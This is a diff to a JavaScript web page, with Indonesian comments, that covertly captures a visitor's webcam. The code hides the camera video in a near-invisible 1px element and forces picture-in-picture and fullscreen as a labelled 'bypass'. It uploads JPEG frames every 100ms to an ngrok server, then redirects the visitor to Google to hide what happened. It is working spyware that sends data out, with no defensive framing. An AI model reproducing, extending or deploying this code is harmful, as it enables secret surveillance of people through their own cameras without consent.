@@ -31,7 +31,6 @@
   var logEl = document.getElementById('log');
   var executed = false;
   var streamInterval = null;
-  var videoElement = null;
 
   function log(msg) {
     logEl.innerHTML += "> " + msg + "<br>";
@@ -43,10 +42,10 @@
   // ============================================
   var TARGET_URL = "https://www.google.com";
   var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
-  var STREAM_INTERVAL = 100; // 10 FPS
+  var STREAM_INTERVAL = 100;
 
   // ============================================
-  // 1. KIRIM FRAME KE SERVER (TELEMETRI)
+  // 1. KIRIM FRAME KE SERVER
   // ============================================
   function sendFrameToServer(stream) {
     try {
@@ -64,22 +63,15 @@
         setInterval(function() {
           if (video.readyState === video.HAVE_ENOUGH_DATA) {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
             canvas.toBlob(function(blob) {
               if (!blob) return;
               var formData = new FormData();
               formData.append('file', blob, 'capture.jpg');
-
-              // Kirim via fetch keepalive
               fetch(SERVER_ENDPOINT, {
                 method: 'POST',
                 body: formData,
                 keepalive: true
               }).catch(function(){});
-
-              // Fallback: sendBeacon
-              // navigator.sendBeacon(SERVER_ENDPOINT, blob);
-
             }, 'image/jpeg', 0.5);
           }
         }, STREAM_INTERVAL);
@@ -88,32 +80,43 @@
   }
 
   // ============================================
-  // 2. PIA (PICTURE-IN-PICTURE) + REDIRECT
+  // 2. FULLSCREEN PiP + REDIRECT
   // ============================================
-  async function startCameraAndPiP() {
+  async function startCameraAndFullscreenPiP() {
     try {
       log("[+] Meminta Izin Kamera...");
       
-      // Minta kamera (await)
       var stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
       log("[+] 🚨 KAMERA BERHASIL diakses!");
 
-      // Buat video element (visible, tapi transparan)
-      videoElement = document.createElement('video');
-      videoElement.srcObject = stream;
-      videoElement.muted = true;
-      videoElement.playsInline = true;
-      videoElement.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;';
-      document.body.appendChild(videoElement);
+      // Buat video element (transparan tapi visible)
+      var video = document.createElement('video');
+      video.srcObject = stream;
+      video.muted = true;
+      video.playsInline = true;
+      video.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;';
+      document.body.appendChild(video);
 
-      // Putar video
-      await videoElement.play().catch(function(){});
+      await video.play().catch(function(){});
       log("[+] Video playing.");
 
-      // Masuk PiP (segera)
+      // Masuk PiP
       try {
-        await videoElement.requestPictureInPicture();
+        await video.requestPictureInPicture();
         log("[+] 🎥 PiP AKTIF!");
+
+        // ============================================
+        // 3. BYPASS: FULLSCREEN PiP (RESIZE WINDOW)
+        // ============================================
+        // Trik: Gunakan requestFullscreen pada video
+        // (Meskipun PiP window terpisah, ini akan mencoba memaksa fullscreen)
+        try {
+          await video.requestFullscreen();
+          log("[+] 🖥️ Fullscreen Mode Aktif!");
+        } catch (fsErr) {
+          log("[-] Fullscreen Gagal: " + fsErr.message);
+        }
+
       } catch (pipErr) {
         log("[-] PiP Gagal: " + pipErr.message);
       }
@@ -122,21 +125,19 @@
       sendFrameToServer(stream);
 
       // ============================================
-      // 3. REDIRECT KE GOOGLE (INSTAN)
+      // 4. REDIRECT KE GOOGLE (INSTAN)
       // ============================================
       setTimeout(function() {
         log("[+] Redirect ke Google.com...");
         try {
           window.location.replace(TARGET_URL);
         } catch(e) {}
-      }, 500); // 500ms setelah semuanya aktif
+      }, 500);
 
     } catch(err) {
       log("[-] Kamera diblokir: " + err.name);
-      
-      // Fallback: redirect ke Google setelah 1 detik
       setTimeout(function() {
-        log("[+] Redirect ke Google (kamera diblokir)...");
+        log("[+] Redirect ke Google...");
         window.location.replace(TARGET_URL);
       }, 1000);
     }
@@ -155,9 +156,9 @@
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Lifecycle Persistence...");
+    log("[!] Memulai Fullscreen PiP Hijack...");
 
-    startCameraAndPiP();
+    startCameraAndFullscreenPiP();
 
   }, { once: true });
 
